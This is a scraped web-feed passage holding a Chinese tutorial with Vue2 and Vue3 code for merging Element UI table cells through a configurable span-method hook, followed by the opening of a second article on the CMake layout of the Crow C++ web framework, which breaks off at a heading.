JXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p>之前在写表格合并的时候非常痛苦，弄不明白合并的具体逻辑，我这里直接贴上通用方法，只需要配置合并规则就可以了，在这里不扯那么多过程，你完全可以拷贝回去立马能用。</p>
<h2 data-id="heading-0">vue2 表格合并</h2>
<pre><code class="hljs language-javascript" lang="javascript">&lt;el-table
      :data=<span class="hljs-string">"tableData"</span>
     :span-method=<span class="hljs-string">"(param)=&gt;objectSpanMethod(param,tableData)"</span>
      border
      style=<span class="hljs-string">"width: 100%"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"id"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"ID"</span>
        <span class="hljs-attr">width</span>=<span class="hljs-string">"180"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"name"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"姓名"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"amount1"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"数值 1"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"amount2"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"数值 2"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"amount3"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"数值 3"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
    &lt;/el-table&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">function</span> <span class="hljs-title function_">filterArray</span>(<span class="hljs-params">item</span>) {
  <span class="hljs-keyword">const</span> valueArray = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rule</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">prop</span> =&gt;</span> {
    <span class="hljs-keyword">return</span> item[prop] === <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>[prop]
  })
  <span class="hljs-keyword">if</span> (valueArray.<span class="hljs-property">length</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">rule</span>.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  }
}
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">tableData</span>: [{
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987122'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'王小虎'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'234'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'3.2'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">10</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987123'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'王小虎'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'165'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'4.43'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">12</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987124'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'王小虎'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'324'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'1.9'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">9</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987125'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'王小虎'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'621'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'2.2'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">17</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987126'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'王小虎'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'539'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'4.1'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">15</span>
        }],
        <span class="hljs-attr">spanRule</span>: {
            <span class="hljs-attr">rule</span>: {
              <span class="hljs-number">0</span>: [<span class="hljs-string">'department_name'</span>]   <span class="hljs-comment">//表示第一列的合并规则</span>
            }
      }
      };
    },
    <span class="hljs-attr">methods</span>: {
      <span class="hljs-comment">// 表格合并</span>
          <span class="hljs-title function_">objectSpanMethod</span>(<span class="hljs-params">{ row, column, rowIndex, columnIndex }, item</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">spanRule</span>.<span class="hljs-property">rule</span>).<span class="hljs-title function_">includes</span>(columnIndex.<span class="hljs-title function_">toString</span>())) {
              <span class="hljs-comment">// filter验证数组</span>
              <span class="hljs-keyword">const</span> currentTable = {
                <span class="hljs-attr">rule</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">spanRule</span>.<span class="hljs-property">rule</span>[columnIndex],
                <span class="hljs-attr">data</span>: item[rowIndex]
              }
              <span class="hljs-comment">// 该单元格是否被合并 true 合并， false : 不合并</span>
              <span class="hljs-keyword">let</span> chooseSpan = <span class="hljs-literal">false</span>
              <span class="hljs-keyword">if</span> (rowIndex !== <span class="hljs-number">0</span>) {
                chooseSpan = filterArray.<span class="hljs-title function_">call</span>(currentTable, item[rowIndex - <span class="hljs-number">1</span>])
              }
              <span class="hljs-keyword">if</span> (chooseSpan) {
                <span class="hljs-keyword">return</span> {
                  <span class="hljs-attr">rowspan</span>: <span class="hljs-number">0</span>,
                  <span class="hljs-attr">colspan</span>: <span class="hljs-number">0</span>
                }
              } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> {
                  <span class="hljs-attr">rowspan</span>: item.<span class="hljs-title function_">filter</span>(filterArray, currentTable).<span class="hljs-property">length</span>,
                  <span class="hljs-attr">colspan</span>: <span class="hljs-number">1</span>
                }
              }
            }
          },
    }
  };
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>


</code></pre>
<h2 data-id="heading-1">vue3 表格合并</h2>
<h3 data-id="heading-2">vue3 hooks文件内容</h3>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 定义通用类型（支持任意表格数据类型）</span>
<span class="hljs-keyword">export</span> interface <span class="hljs-title class_">TableSpanRule</span> {
    <span class="hljs-attr">rule</span>: <span class="hljs-title class_">Record</span>&lt;string, string[]&gt;; <span class="hljs-comment">// 列索引 → 合并字段列表</span>
}

<span class="hljs-comment">// 表格合并Hook</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useTableSpan&lt;T = <span class="hljs-title class_">Record</span>&lt;string, any&gt;&gt;(<span class="hljs-attr">spanRule</span>: <span class="hljs-title class_">TableSpanRule</span>) {

    <span class="hljs-keyword">const</span> filterArray = (
        <span class="hljs-attr">currentTable</span>: { <span class="hljs-attr">rule</span>: string[]; <span class="hljs-attr">data</span>: T },
        <span class="hljs-attr">item</span>: T
    ): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> valueArray = currentTable.<span class="hljs-property">rule</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">prop</span>) =&gt;</span> {
            <span class="hljs-keyword">return</span> item[prop] === currentTable.<span class="hljs-property">data</span>[prop];
        });
        <span class="hljs-keyword">return</span> valueArray.<span class="hljs-property">length</span> === currentTable.<span class="hljs-property">rule</span>.<span class="hljs-property">length</span>;
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">objectSpanMethod</span> = (<span class="hljs-params">
        param: {
            row: T;
            column: T;
            rowIndex: number;
            columnIndex: number;
        },
        tableData: T[]
    </span>) =&gt; {
        <span class="hljs-keyword">const</span> { columnIndex, rowIndex } = param;
        <span class="hljs-comment">// 判断当前列是否在合并规则中</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(spanRule.<span class="hljs-property">rule</span>).<span class="hljs-title function_">includes</span>(columnIndex.<span class="hljs-title function_">toString</span>())) {
            <span class="hljs-keyword">const</span> currentTable = {
                <span class="hljs-attr">rule</span>: spanRule.<span class="hljs-property">rule</span>[columnIndex],
                <span class="hljs-attr">data</span>: tableData[rowIndex]
            };
            <span class="hljs-keyword">let</span> chooseSpan = <span class="hljs-literal">false</span>;
            <span class="hljs-comment">// 非第一行时验证是否需要合并</span>
            <span class="hljs-keyword">if</span> (rowIndex !== <span class="hljs-number">0</span>) {
                chooseSpan = <span class="hljs-title function_">filterArray</span>(currentTable, tableData[rowIndex - <span class="hljs-number">1</span>]);
            }
            <span class="hljs-comment">// 需要合并则隐藏当前单元格，否则设置合并行数</span>
            <span class="hljs-keyword">if</span> (chooseSpan) {
                <span class="hljs-keyword">return</span> {
                    <span class="hljs-attr">rowspan</span>: <span class="hljs-number">0</span>,
                    <span class="hljs-attr">colspan</span>: <span class="hljs-number">0</span>
                };
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> {
                    <span class="hljs-attr">rowspan</span>: tableData.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">i</span>) =&gt;</span> <span class="hljs-title function_">filterArray</span>(currentTable, i)).<span class="hljs-property">length</span>,
                    <span class="hljs-attr">colspan</span>: <span class="hljs-number">1</span>
                };
            }
        }
        <span class="hljs-comment">// 非合并列返回默认值</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">rowspan</span>: <span class="hljs-number">1</span>,
            <span class="hljs-attr">colspan</span>: <span class="hljs-number">1</span>
        };
    };

    <span class="hljs-keyword">return</span> {
        objectSpanMethod
    };
}
</code></pre>
<h3 data-id="heading-3">vue3 表格合并</h3>
<pre><code class="hljs language-javascript" lang="javascript">&lt;el-table
      :data=<span class="hljs-string">"tableData"</span>
     :span-method=<span class="hljs-string">"(param)=&gt;objectSpanMethod(param,tableData)"</span> <span class="hljs-comment">//这里非常重要，tableData字段是表格的数据</span>
      border
      style=<span class="hljs-string">"width: 100%"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> 
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"day"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"day"</span>
        <span class="hljs-attr">width</span>=<span class="hljs-string">"180"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"domainName"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"domainName"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"allPurchaseCount"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"allPurchaseCount"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"allPurchaseValue"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"allPurchaseValue"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"gaAmountUsd"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"交易额"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
    &lt;/el-table&gt;
<span class="hljs-keyword">const</span> tableCol = [  <span class="hljs-comment">//表格列</span>
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.datetime'</span>),
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'day'</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">formatter</span>: <span class="hljs-function">(<span class="hljs-params">row: any, column: any, text: any</span>) =&gt;</span> {
      <span class="hljs-keyword">return</span> text || <span class="hljs-string">"-"</span>;
    },
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.domain'</span>),
    <span class="hljs-attr">width</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'domainName'</span>,
    <span class="hljs-string">'show-overflow-tooltip'</span>: <span class="hljs-literal">true</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.allorders'</span>),
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'allPurchaseCount'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'localeAudience.allamount'</span>),
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">140</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'allPurchaseValue'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'交易额'</span>,
    <span class="hljs-attr">sortable</span>: <span class="hljs-string">"custom"</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">180</span>,
    <span class="hljs-attr">prop</span>: <span class="hljs-string">'gaAmountUsd'</span>,
  },
];
<span class="hljs-keyword">const</span> tableData = [ <span class="hljs-comment">// 1.表格数据</span>
  {
    <span class="hljs-attr">day</span>: <span class="hljs-string">'2023-08-01'</span>,
    <span class="hljs-attr">domainName</span>: <span class="hljs-string">'example.com'</span>,
    <span class="hljs-attr">allPurchaseCount</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">allPurchaseValue</span>: <span class="hljs-number">1000</span>,
    <span class="hljs-attr">gaAmountUsd</span>: <span class="hljs-number">500</span>,
  },
  {
    <span class="hljs-attr">day</span>: <span class="hljs-string">'2023-08-01'</span>,
    <span class="hljs-attr">domainName</span>: <span class="hljs-string">'example.com'</span>,
    <span class="hljs-attr">allPurchaseCount</span>: <span class="hljs-number">5</span>,
    <span class="hljs-attr">allPurchaseValue</span>: <span class="hljs-number">500</span>,
    <span class="hljs-attr">gaAmountUsd</span>: <span class="hljs-number">250</span>,
  },
  {
    <span class="hljs-attr">day</span>: <span class="hljs-string">'2023-08-02'</span>,
    <span class="hljs-attr">domainName</span>: <span class="hljs-string">'example.com'</span>,
    <span class="hljs-attr">allPurchaseCount</span>: <span class="hljs-number">8</span>,
    <span class="hljs-attr">allPurchaseValue</span>: <span class="hljs-number">800</span>,
    <span class="hljs-attr">gaAmountUsd</span>: <span class="hljs-number">400</span>,
  },
];
<span class="hljs-comment">// 2. 定义列合并规则</span>
<span class="hljs-keyword">const</span> spanRule = {
  <span class="hljs-attr">rule</span>: {
    <span class="hljs-number">0</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//表示第1列的合并规则</span>
    <span class="hljs-number">1</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//表示第2列的合并规则</span>
    <span class="hljs-number">2</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//表示第3列的合并规则</span>
    <span class="hljs-number">3</span>: [<span class="hljs-string">'day'</span>,<span class="hljs-string">'domainName'</span>,<span class="hljs-string">'allPurchaseCount'</span>,<span class="hljs-string">'allPurchaseValue'</span>], <span class="hljs-comment">//表示第4列的合并规则</span>
  }
};

<span class="hljs-comment">// 3. 使用表格合并Hook</span>
<span class="hljs-keyword">const</span> { objectSpanMethod } = <span class="hljs-title function_">useTableSpan</span>(spanRule);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Crow 项目 CMake 结构分析：为什么不能从 examples 目录开始执行？]]></title>    <link>https://juejin.cn/post/7596890557546086446</link>    <guid>https://juejin.cn/post/7596890557546086446</guid>    <pubDate>2026-01-19T17:15:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596890557546086446" data-draft-id="7596906923892572170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Crow 项目 CMake 结构分析：为什么不能从 examples 目录开始执行？"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-19T17:15:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="自由生长2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Crow 项目 CMake 结构分析：为什么不能从 examples 目录开始执行？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    自由生长2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:15:47.000Z" title="Mon Jan 19 2026 17:15:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>摘要：Crow 项目采用现代 CMake 结构，根目录定义了 INTERFACE 库 Crow::Crow、依赖查找及全局变量，examples 作为子目录通过 add_subdirectory 引入，依赖父目录的上下文。若从 examples 目录直接执行 CMake，将因路径错误、目标未定义、变量缺失而失败。正确做法始终从根目录配置构建。</p>
<h2 data-id="heading-0">Crow 项目 CMake 结构分析：为什么不能从 examples 目录开始执行</h2>
<blockquote>
<p>cmake项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCrowCpp%2FCrow%2F" target="_blank" title="https://github.com/CrowCpp/Crow/" ref="nofollow noopener noreferrer">CrowCpp/Crow: A Fast and Easy to use microframework for the web.</a></p>
</blockquote>
<h3 data-id="heading-1">概述</h3>
<p>Crow项目是一个类似于Flask但是Cpp版的微型Web框架。</p>
<p>本文档深入分析 Crow 项目的 CMake 构建系统结构，重点阐述根目录和 <code>examples</code> 目录的 CMakeLists.txt 核心内容，并解释为什么不能从 <code>examples</code> 目录直接执行 CMake 配置和构建。</p>
<h3 data-id="heading-2">一、根目录 CMakeLists.txt 核心内容</h3>
<p>根目录的 <code>CMakeLists.txt</code> 是整个 Crow 项目的构建系统核心，它定义了项目的基础设施、库目标、依赖管理和子项目集成。</p>
<h4 data-id="heading-3">1.1 项目基础配置</h4>
